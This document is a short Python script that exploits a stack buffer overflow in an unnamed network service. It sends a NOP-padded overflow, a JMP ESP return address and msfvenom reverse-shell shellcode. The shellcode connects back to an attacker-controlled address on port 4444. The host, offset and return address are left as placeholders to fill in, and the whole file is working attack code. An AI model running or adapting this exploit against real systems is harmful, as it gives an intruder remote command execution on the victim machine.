#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = ""   # change this
port = 999 #change this

#Payload: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.178.22 LPORT=4444 -b ‘\x00\xff\xaa\x0d’ -f python -v shellcode
shellcode =  "\x90" *10
shellcode += "\xdd\xc6\xbd\x5e\xbf\x2a\x3b\xd9\x74\x24\xf4\x58"    
shellcode += "\x29\xc9\xb1\x52\x31\x68\x17\x83\xe8\xfc\x03\x36"
shellcode += "\xac\xc8\xce\x3a\x3a\x8e\x31\xc2\xbb\xef\xb8\x27"
shellcode += "\x8a\x2f\xde\x2c\xbd\x9f\x94\x60\x32\x6b\xf8\x90"
shellcode += "\xc1\x19\xd5\x97\x62\x97\x03\x96\x73\x84\x70\xb9"
shellcode += "\xf7\xd7\xa4\x19\xc9\x17\xb9\x58\x0e\x45\x30\x08"
shellcode += "\xc7\x01\xe7\xbc\x6c\x5f\x34\x37\x3e\x71\x3c\xa4"
shellcode += "\xf7\x70\x6d\x7b\x83\x2a\xad\x7a\x40\x47\xe4\x64"
shellcode += "\x85\x62\xbe\x1f\x7d\x18\x41\xc9\x4f\xe1\xee\x34"
shellcode += "\x60\x10\xee\x71\x47\xcb\x85\x8b\xbb\x76\x9e\x48"
shellcode += "\xc1\xac\x2b\x4a\x61\x26\x8b\xb6\x93\xeb\x4a\x3d"
shellcode += "\x9f\x40\x18\x19\xbc\x57\xcd\x12\xb8\xdc\xf0\xf4"
shellcode += "\x48\xa6\xd6\xd0\x11\x7c\x76\x41\xfc\xd3\x87\x91"
shellcode += "\x5f\x8b\x2d\xda\x72\xd8\x5f\x81\x1a\x2d\x52\x39"
shellcode += "\xdb\x39\xe5\x4a\xe9\xe6\x5d\xc4\x41\x6e\x78\x13"
shellcode += "\xa5\x45\x3c\x8b\x58\x66\x3d\x82\x9e\x32\x6d\xbc"
shellcode += "\x37\x3b\xe6\x3c\xb7\xee\xa9\x6c\x17\x41\x0a\xdc"
shellcode += "\xd7\x31\xe2\x36\xd8\x6e\x12\x39\x32\x07\xb9\xc0"
shellcode += "\xd5\xe8\x96\x78\x33\x81\xe4\x7c\x2d\x0d\x60\x9a"
shellcode += "\x27\xbd\x24\x35\xd0\x24\x6d\xcd\x41\xa8\xbb\xa8"
shellcode += "\x42\x22\x48\x4d\x0c\xc3\x25\x5d\xf9\x23\x70\x3f"
shellcode += "\xac\x3c\xae\x57\x32\xae\x35\xa7\x3d\xd3\xe1\xf0"
shellcode += "\x6a\x25\xf8\x94\x86\x1c\x52\x8a\x5a\xf8\x9d\x0e"
shellcode += "\x81\x39\x23\x8f\x44\x05\x07\x9f\x90\x86\x03\xcb"
shellcode += "\x4c\xd1\xdd\xa5\x2a\x8b\xaf\x1f\xe5\x60\x66\xf7"
shellcode += "\x70\x4b\xb9\x81\x7c\x86\x4f\x6d\xcc\x7f\x16\x92"
shellcode += "\xe1\x17\x9e\xeb\x1f\x88\x61\x26\xa4\xb8\x2b\x6a"
shellcode += "\x8d\x50\xf2\xff\x8f\x3c\x05\x2a\xd3\x38\x86\xde"
shellcode += "\xac\xbe\x96\xab\xa9\xfb\x10\x40\xc0\x94\xf4\x66"
shellcode += "\x77\x94\xdc"


junk = "\x90"* 524  #change offset
jmp_esp = "\xf3\x12\x17\x31"  #change jmp_esp

payload = junk+ jmp_esp  + shellcode 


print "\sending evil buffer..." 
s.connect((host,port)) 
data = s.recv(1024) 
s.send(payload + '\r\n') 
print "\nDone!"
